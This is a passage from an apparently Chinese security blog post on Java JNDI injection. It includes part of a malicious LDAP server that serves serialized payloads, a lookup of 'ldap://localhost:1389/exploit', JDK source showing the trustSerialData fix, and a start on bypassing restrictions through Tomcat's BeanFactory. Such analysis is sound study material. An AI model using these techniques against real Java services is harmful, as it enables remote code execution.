class="line">            <span class="built_in">this</span>.entry = <span class="keyword">new</span> <span class="title class_">Entry</span>(BASE);</span><br><span class="line">            <span class="comment">// 提示类名（非强约束，大多实现不严格校验）</span></span><br><span class="line">            entry.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;java.lang.Object&quot;</span>);</span><br><span class="line">            <span class="comment">// 关键：承载 Java 序列化对象的字节数组</span></span><br><span class="line">            entry.addAttribute(<span class="string">&quot;javaSerializedData&quot;</span>, payload);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span><span class="params">(InMemoryInterceptedSearchResult result)</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 直接把预构建条目作为搜索结果返回（忽略请求的 baseDN / scope）</span></span><br><span class="line">                result.sendSearchEntry(entry);</span><br><span class="line">                result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">                ex.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>攻击过程如下：</p>
<pre class="mermaid">sequenceDiagram
    autonumber

    %% ── 客户端（本机进程） ──
    box rgb(230,242,255) 客户端（进程）
      participant App as Client 应用 💻
      participant IC as InitialContext
      participant LURL as ldapURLContext
      participant LCtx as LdapCtx
      participant OBJ as Obj
    end

    %% ── 目录服务（远端） ──
    box rgb(232,245,233) LDAP 服务器
      participant LDAP as LDAP 服务 📇
    end

    %% 1) JNDI 访问 LDAP
    App->>IC: lookup ldap://localhost:1389/exploit
    IC->>LURL: 选择 LDAP 提供者
    LURL->>LCtx: c_lookup

    %% 2) 返回包含序列化数据的条目
    LCtx->>LDAP: search base=exploit scope=OBJECT filter=(objectClass=*)
    LDAP-->>LCtx: 返回条目 含 javaSerializedData 和 javaClassName

    %% 3) decodeObject 进入 javaSerializedData 分支
    LCtx->>OBJ: decodeObject

    %% 4) 反序列化分支 对比修复
    alt 允许反序列化 版本在 17.0.13 11.0.25 8u461 之前 或 设置 trustSerialData=true 🔓
      OBJ->>OBJ: deserializeObject 读取对象
      OBJ->>OBJ: ObjectInputStream.readObject 
      note right of OBJ: 🚨触发链反序列化链
    else 禁止反序列化 17.0.13 11.0.25 8u461 起 且 trustSerialData=false 🔒
      OBJ-->>LCtx: NamingException 不允许反序列化
      LCtx-->>App: lookup 失败 或 安全回退
    end</pre>

<p>调用栈如下：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">at com.sun.jndi.ldap.Obj.deserializeObject(Obj.java:531)</span><br><span class="line">at com.sun.jndi.ldap.Obj.decodeObject(Obj.java:239)</span><br><span class="line">at com.sun.jndi.ldap.LdapCtx.c_lookup(LdapCtx.java:1051)</span><br><span class="line">at com.sun.jndi.toolkit.ctx.ComponentContext.p_lookup(ComponentContext.java:542)</span><br><span class="line">at com.sun.jndi.toolkit.ctx.PartialCompositeContext.lookup(PartialCompositeContext.java:177)</span><br><span class="line">at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)</span><br><span class="line">at com.sun.jndi.url.ldap.ldapURLContext.lookup(ldapURLContext.java:94)</span><br><span class="line">at javax.naming.InitialContext.lookup(InitialContext.java:417)</span><br><span class="line">at org.example.Client.main(Client.java:9)</span><br></pre></td></tr></table></figure></div>

<p>从 JDK8u461 开始 <code>com.sun.jndi.ldap.Obj#decodeObject</code> 的逻辑变了：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 从 LDAP Attribute 集合中“解码”为 Java 对象。</span></span><br><span class="line"><span class="comment"> * 支持的三种形态（按优先级依次判断）：</span></span><br><span class="line"><span class="comment"> *   1) 序列化对象（javaSerializedData）</span></span><br><span class="line"><span class="comment"> *   2) 远程位置（javaRemoteLocation）——返回一个 RMI 远程对象桩（仅为兼容保留）</span></span><br><span class="line"><span class="comment"> *   3) JNDI Reference（基于 ObjectFactory 进行还原）</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 说明：</span></span><br><span class="line"><span class="comment"> * - 所有分支都会先解析 codebase（class 下载位置），随后按需用于类加载。</span></span><br><span class="line"><span class="comment"> * - VersionHelper12.isSerialDataAllowed() 是“反序列化允许”的安全开关，</span></span><br><span class="line"><span class="comment"> *   若关闭则直接拒绝 1) 和 2) 这两种会触发反序列化的路径。</span></span><br><span class="line"><span class="comment"> * - 具体属性名通过 JAVA_ATTRIBUTES[...] 常量访问，例如：</span></span><br><span class="line"><span class="comment"> *   CODEBASE / SERIALIZED_DATA / REMOTE_LOC / OBJECT_CLASS / CLASSNAME 等。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> Object <span class="title function_">decodeObject</span><span class="params">(Attributes attrs)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line"></span><br><span class="line">    Attribute attr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析 codebase（类加载的 URL 列表）。供所有路径使用。</span></span><br><span class="line">    String[] codebases = getCodebases(attrs.get(JAVA_ATTRIBUTES[CODEBASE]));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// ① 优先分支：存在序列化数据（javaSerializedData）</span></span><br><span class="line">        <span class="keyword">if</span> ((attr = attrs.get(JAVA_ATTRIBUTES[SERIALIZED_DATA])) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 安全闸：是否允许进行反序列化</span></span><br><span class="line">            <span class="keyword">if</span> (!VersionHelper12.isSerialDataAllowed()) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>(<span class="string">&quot;Object deserialization is not allowed&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 基于 codebase 构造 URLClassLoader（可能涉及远程加载）</span></span><br><span class="line">            <span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> helper.getURLClassLoader(codebases);</span><br><span class="line">            <span class="comment">// 将属性里的字节数组反序列化为对象（使用上面的类加载器）</span></span><br><span class="line">            <span class="keyword">return</span> deserializeObject((<span class="type">byte</span>[]) attr.get(), cl);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ② 兼容分支：存在 javaRemoteLocation（历史用途，用于创建 RMI stub）</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((attr = attrs.get(JAVA_ATTRIBUTES[REMOTE_LOC])) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 该路径同样会触发反序列化安全检查</span></span><br><span class="line">            <span class="keyword">if</span> (!VersionHelper12.isSerialDataAllowed()) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>(<span class="string">&quot;Object deserialization is not allowed&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 为了“向后兼容”保留的逻辑：根据类名 + 远程位置构造 RMI 对象</span></span><br><span class="line">            <span class="comment">// CLASSNAME: 目标类名；REMOTE_LOC: 远程位置字符串</span></span><br><span class="line">            <span class="keyword">return</span> decodeRmiObject(</span><br><span class="line">                (String) attrs.get(JAVA_ATTRIBUTES[CLASSNAME]).get(),</span><br><span class="line">                (String) attr.get(),</span><br><span class="line">                codebases);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ③ Reference 分支：objectClass 包含 &quot;javaNamingReference&quot;（或其小写）</span></span><br><span class="line">        attr = attrs.get(JAVA_ATTRIBUTES[OBJECT_CLASS]);</span><br><span class="line">        <span class="keyword">if</span> (attr != <span class="literal">null</span> &amp;&amp;</span><br><span class="line">            (attr.contains(JAVA_OBJECT_CLASSES[REF_OBJECT]) ||</span><br><span class="line">             attr.contains(JAVA_OBJECT_CLASSES_LOWER[REF_OBJECT]))) &#123;</span><br><span class="line">            <span class="comment">// 将 LDAP 条目按 Reference 语义解析，并交由 ObjectFactory 还原为对象</span></span><br><span class="line">            <span class="keyword">return</span> decodeReference(attrs, codebases);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 未匹配到任何已知形态，返回 null</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        <span class="comment">// I/O 异常统一包装为 NamingException，并记录根因</span></span><br><span class="line">        <span class="type">NamingException</span> <span class="variable">ne</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>();</span><br><span class="line">        ne.setRootCause(e);</span><br><span class="line">        <span class="keyword">throw</span> ne;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>javaSerializedData</code> 和 <code>javaRemoteLocation</code> 两个分支中都增加了反序列化的限制代码</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!VersionHelper12.isSerialDataAllowed()) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>(<span class="string">&quot;Object deserialization is not allowed&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>isSerialDataAllowed</code> 函数返回的是 <code>trustSerialData</code> 属性。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 返回是否允许从 LDAP 属性中进行对象的“反序列化/重构”。</span></span><br><span class="line"><span class="comment"> * 受控的三类属性包括：</span></span><br><span class="line"><span class="comment"> *   - &#x27;javaSerializedData&#x27;        （直接反序列化对象字节）</span></span><br><span class="line"><span class="comment"> *   - &#x27;javaRemoteLocation&#x27;        （历史兼容：基于远程位置重构 RMI 对象）</span></span><br><span class="line"><span class="comment"> *   - &#x27;javaReferenceAddress&#x27;      （Reference 中的地址可携带序列化内容）</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> true 表示允许；false 表示一律拒绝（抛 NamingException）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isSerialDataAllowed</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 关键总开关：由类中的静态布尔量 trustSerialData 决定</span></span><br><span class="line">    <span class="comment">// trustSerialData 一般在类初始化时从“系统/安全属性”读取并缓存，</span></span><br><span class="line">    <span class="comment">// 典型属性名：com.sun.jndi.ldap.object.trustSerialData</span></span><br><span class="line">    <span class="keyword">return</span> trustSerialData;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>而 <code>trustSerialData</code> 属性的值由 <code>com.sun.jndi.ldap.object.trustSerialData</code> 系统属性觉得，初始化方式跟之前的 <code>trustURLCodebase</code> 类似，都是在静态代码块初始化的。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 控制是否信任“任意 URL codebase”去加载类的系统属性（影响是否创建 URLClassLoader 等）</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TRUST_URL_CODEBASE_PROPERTY</span> <span class="operator">=</span></span><br><span class="line">    <span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 控制是否允许从下列 LDAP 属性中“反序列化/重构”对象：</span></span><br><span class="line"><span class="comment">// 1) javaSerializedData</span></span><br><span class="line"><span class="comment">// 2) javaRemoteLocation（历史兼容，用于 RMI stub）</span></span><br><span class="line"><span class="comment">// 3) javaReferenceAddress（Reference 的地址里可能嵌序列化内容）</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TRUST_SERIAL_DATA_PROPERTY</span> <span class="operator">=</span></span><br><span class="line">    <span class="string">&quot;com.sun.jndi.ldap.object.trustSerialData&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * true 表示允许从上述 3 类属性进行反序列化或对象重构；</span></span><br><span class="line"><span class="comment"> * false 表示一律不允许（在 decodeObject() 等路径直接抛 NamingException）。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">boolean</span> trustSerialData;</span><br><span class="line"></span><br><span class="line"><span class="comment">// true 表示允许从任意 URL codebase 加载类；false 表示禁用远程 codebase。</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">boolean</span> trustURLCodebase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    <span class="comment">// 读取系统属性 com.sun.jndi.ldap.object.trustURLCodebase，默认 &quot;false&quot;</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">trust</span> <span class="operator">=</span> getPrivilegedProperty(TRUST_URL_CODEBASE_PROPERTY, <span class="string">&quot;false&quot;</span>);</span><br><span class="line">    trustURLCodebase = <span class="string">&quot;true&quot;</span>.equalsIgnoreCase(trust);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取系统属性 com.sun.jndi.ldap.object.trustSerialData，默认 &quot;false&quot;</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">trustSDString</span> <span class="operator">=</span> getPrivilegedProperty(TRUST_SERIAL_DATA_PROPERTY, <span class="string">&quot;false&quot;</span>);</span><br><span class="line">    trustSerialData = <span class="string">&quot;true&quot;</span>.equalsIgnoreCase(trustSDString);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="本地类利用"><a href="#本地类利用" class="headerlink" title="本地类利用"></a>本地类利用</h3><p>前面利用 JNDI 的References 机制进行远程类加载的时候，最终都是利用 <code>javax.naming.spi.NamingManager#getObjectFactoryFromReference</code> 方法实现的。</p>
<p>但是从 JDK8u131 和 JDK8u191 开始，JNDI-RMI 和 JNDI-LDAP 分别增加了 <code>com.sun.jndi.rmi.object.trustURLCodebase</code> 和 <code>com.sun.jndi.ldap.object.trustURLCodebase</code> 两个现在，导致 JNDI 注入无法通过远程类加载来实现 RCE。</p>
<p>然而 <code>javax.naming.spi.NamingManager#getObjectFactoryFromReference</code> 不光是远程类加载，该方法在远程加载工厂类之前还会尝试从本地 classpath 加载类。因此我们可以尝试从本地寻找可用类。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 根据 Reference 中记录的“工厂类名 + 可选的 codebase（工厂位置）”来加载工厂类，</span></span><br><span class="line"><span class="comment"> * 并返回该工厂类的实例（必须实现 ObjectFactory，且具备 public 无参构造）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 加载顺序（失败则回退）：</span></span><br><span class="line"><span class="comment"> * 1) 先用“当前/默认”的类加载器尝试加载 factoryName；</span></span><br><span class="line"><span class="comment"> * 2) 若不在本地 classpath，再读取 ref.getFactoryClassLocation()（codebase），</span></span><br><span class="line"><span class="comment"> *    通过该位置尝试加载（例如 http/file/ftp 等）；</span></span><br><span class="line"><span class="comment"> *    —— 若成功则返回实例；若仍失败则返回 null。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> ref          非空；包含工厂类名与可选 codebase 的 Reference</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> factoryName  非空；工厂类的完全限定名（FQCN）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>             成功则返回工厂实例；否则返回 null（未能加载工厂）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IllegalAccessException   无权访问无参构造时抛出</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> InstantiationException   抽象类/接口或构造失败时抛出</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> MalformedURLException    codebase 字符串不是合法 URL 时抛出</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> ObjectFactory <span class="title function_">getObjectFactoryFromReference</span><span class="params">(</span></span><br><span class="line"><span class="params">        Reference ref, String factoryName)</span></span><br><span class="line">        <span class="keyword">throws</span> IllegalAccessException, InstantiationException, MalformedURLException &#123;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; clas = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1) 优先使用当前（上下文）类加载器加载工厂类</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        clas = helper.loadClass(factoryName);  <span class="comment">// VersionHelper 抽象了不同 JDK 的装载细节</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        <span class="comment">// 忽略，转而尝试 codebase 路径</span></span><br><span class="line">        <span class="comment">// e.printStackTrace();</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 其余异常（如安全限制）不在此处吞掉，直接向上抛出</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) 若本地未找到且 Reference 指定了工厂位置（codebase），</span></span><br><span class="line">    <span class="comment">//    则基于该 codebase 再次尝试加载</span></span><br><span class="line">    String codebase;</span><br><span class="line">    <span class="keyword">if</span> (clas == <span class="literal">null</span> &amp;&amp; (codebase = ref.getFactoryClassLocation()) != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            clas = helper.loadClass(factoryName, codebase);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="comment">// 仍找不到则保持 clas=null，稍后返回 null</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) 成功加载则实例化并返回；否则返回 null</span></span><br><span class="line">    <span class="keyword">return</span> (clas != <span class="literal">null</span>) ? (ObjectFactory) clas.newInstance() : <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>无论是 RMI 还是 LDAP 在调用 <code>getObjectFactoryFromReference</code> 获取到 <code>javax.naming.spi.ObjectFactory</code> 接口实例之后都会调用实例的 <code>getObjectInstance</code> 方法，并且传入 <code>Reference</code> 对象。</p>
<ul>
<li><p>RMI 的 <code>javax.naming.spi.NamingManager</code>：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 尽量把 refInfo 规范化为 Reference：</span></span><br><span class="line"><span class="comment">// - 如果本身就是 Reference：直接使用；</span></span><br><span class="line"><span class="comment">// - 如果实现了 Referenceable：通过 getReference() 取出其 Reference 表示。</span></span><br><span class="line"><span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Reference) &#123;</span><br><span class="line">    ref = (Reference) refInfo;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Referenceable) &#123;</span><br><span class="line">    ref = ((Referenceable)(refInfo)).getReference();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ref != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="comment">// 从 Reference 中取“工厂类名”</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">f</span> <span class="operator">=</span> ref.getFactoryClassName();</span><br><span class="line">    <span class="keyword">if</span> (f != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 根据 ref 从本地 classpath 加载工厂类</span></span><br><span class="line">        factory = getObjectFactoryFromReference(ref, f);</span><br><span class="line">        <span class="keyword">if</span> (factory != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 成功加载到工厂：把 Reference 与 name/nameCtx/environment 传给工厂，</span></span><br><span class="line">            <span class="comment">// 由工厂的 getObjectInstance(...) 生成最终对象并返回。</span></span><br><span class="line">            <span class="keyword">return</span> factory.getObjectInstance(ref, name, nameCtx, environment);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>LDAP 的 <code>javax.naming.spi.DirectoryManager#getObjectInstance</code>：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Reference) &#123;</span><br><span class="line">    ref = (Reference) refInfo;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Referenceable) &#123;</span><br><span class="line">    ref = ((Referenceable)(refInfo)).getReference();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ref != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">f</span> <span class="operator">=</span> ref.getFactoryClassName();</span><br><span class="line">    <span class="keyword">if</span> (f != <span class="literal">null</span>) &#123;</span><br><span class="line">        factory = getObjectFactoryFromReference(ref, f);</span><br><span class="line">        <span class="comment">// 目录服务专用分支：若为 DirObjectFactory，则调用带 Attributes 的重载</span></span><br><span class="line">        <span class="keyword">if</span> (factory <span class="keyword">instanceof</span> DirObjectFactory) &#123;</span><br><span class="line">            <span class="keyword">return</span> ((DirObjectFactory)factory).getObjectInstance(</span><br><span class="line">                ref, name, nameCtx, environment, attrs);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (factory != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> factory.getObjectInstance(ref, name, nameCtx,</span><br><span class="line">                                             environment);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<p>由于 <code>Reference</code> 对象是从我们的恶意 RMI&#x2F;LDAP 服务器获取的，因此该对象中的<strong>工厂类名</strong>（<code>classFactory</code>）是我们可控的，并且我们还何以往 <code>Reference</code> 对象中添加 <strong><code>RefAddr</code> 参数</strong>，用来控制工厂类创建对象过程。</p>
<p>因此我们需要寻找合适的实现 <code>javax.naming.spi.ObjectFactory</code> 接口的合适对象来完成利用。</p>
<p>目前公开常用的利用方法是通过 <strong>Tomcat</strong> 的	去调用 <strong><code>javax.el.ELProcessor#eval</code></strong> 方法或 <strong><code>groovy.lang.GroovyShell#evaluate</code></strong> 方法。</p>
<p><strong><code>org.apache.naming.factory.BeanFactory</code> 是 Tomcat 自带的一个 JNDI “对象工厂”（<code>ObjectFactory</code>）</strong>。它的职责是——当应用在 JNDI 里 <code>lookup()</code> 一个条目时，<strong>按 JavaBean 规范</strong>创建目标对象（必须有无参构造器、<code>setXxx(...)</code> 风格的属性写入方法），再把 <code>&lt;Resource ...&gt;</code> 或 <code>Reference</code> 里声明的属性<strong>逐个注入</strong>到这个对象上，最后把实例返回给调用者。</p>
<p><code>org.apache.naming.ResourceRef.BeanFactory#getObjectInstance</code> 函数实现如下：</p>
